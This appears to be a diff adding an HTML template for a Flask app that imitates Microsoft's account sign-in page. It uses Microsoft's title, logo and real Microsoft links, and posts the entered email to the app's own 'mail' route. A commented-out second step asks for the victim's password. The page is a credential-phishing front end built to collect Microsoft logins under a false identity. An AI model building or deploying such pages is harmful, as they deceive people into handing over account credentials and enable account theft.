@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="../static/css/styles.css">
+    <link rel="icon" type="image/x-icon" href="/static/image/logo.ico">
+
+    <style>
+        form {
+          width:100%;
+          overflow:hidden;
+        }
+        form {
+          animation: slide-left 0.5s;
+        }
+        
+        @keyframes slide-left {
+          from {
+            margin-left: 100%;
+            width: 300%; 
+          }
+        
+          to {
+            margin-left: 0%;
+            width: 100%;
+          }
+        }
+        </style>
+
+</head>
+
+
+</script>
+
+<body onload="script()">
+    <div class = 'wrapper'>
+    <div id="div1">
+        <img id="img1" src="/static/image/microsoftlogo.png" alt="pic">
+        <p id="p1">Sign in</p>
+
+        <form action="{{ url_for('mail') }}" method="post" >
+            <input name="email" class="no-outline" type="email"  placeholder="Email, phone, or Skype" required>
+            <hr>
+            <label id="label1" for="">No account?</label>
+            <a id="a1" href="https://signup.live.com/signup">
+                Create one!
+            </a>
+            <br><br>
+            <a id="a2" href="https://login.microsoftonline.com/">
+                Can't access your account?</a>
+            <!-- <a id="a3" href="#"><img id="img2" src="/static/image/q4.png" alt=""></a><br><br> -->
+            <button id="back" style="text-align: center;" value = 'Back'>
+                <a id="a5" style="text-decoration:none;" href="https://account.microsoft.com/account/Account?refp=signedout-index&refd=login.microsoftonline.com&ru=https%3A%2F%2Faccount.microsoft.com%2F%3Frefp%3Dsignedout-index%26refd%3Dlogin.microsoftonline.com&destrt=home.landing">
+                    Back
+                </a>   
+            </button>
+            <button id="submit" name="submit" type="submit"> Next</button>
+
+            
+            <!-- <button id="back" type="submit" name="submit"> Back</button> -->
+        </form>
+
+    </div>
+
+    <div id="div2">
+        <button id="button1">
+            <img id="img3" src="/static/image/key.png" alt="">
+                <a id="signin_options" href="/">
+                    <label id="label2" for="">Sign-in options</label>
+                </a>
+        </button>
+
+    </div>
+
+    <div id="div3">
+        <a id="a4" href="#">Terms of use</a>
+        <a id="a5" href="#">Privacy & cookies</a>
+
+    </div>
+    </div>
+
+    <!-- <div class="wrapper">
+    <div id="div1">
+        <img id="img1" src="/static/image/microsoftlogo.png" alt="pic">
+        <a href="{{ url_for ('mail') }}" style="text-decoration:none;"><p> &larr; {{ email }}</p></a>
+        <a href="{{ url_for ('mail') }}" style="text-decoration:none;"><p> &larr; {{ ail }}</p></a>
+        <a href="{{ url_for ('mail') }}" style="text-decoration:none;"><p> &larr; {{ name }}</p></a>
+        
+        <p id="p1">Enter Password</p>
+        <form action="/">
+        <input id="textbox" type="text" name="password" placeholder="Password" required>
+        <hr>
+        <a id="a2" href="#">Forgot password?</a>
+        <input id="submit" type="submit" name="submit" value="Sign in">
+    </form>
+    </div>
+
+    <div id="div2">
+        <button id="button1">
+            <img id="img3" src="/static/image/key.png" alt="">
+            <label id="label2" for="">Sign-in options</label>
+        </button>
+
+    </div>
+
+    </div> -->
+
+    <!-- <script language="javascript">
+        function autoResizeDiv()
+        {
+            document.getElementById('wrapper').style.height = window.innerHeight +'px';
+        }
+        window.onresize = autoResizeDiv;
+        autoResizeDiv(); -->
+    </script>
+</body>
+</html>
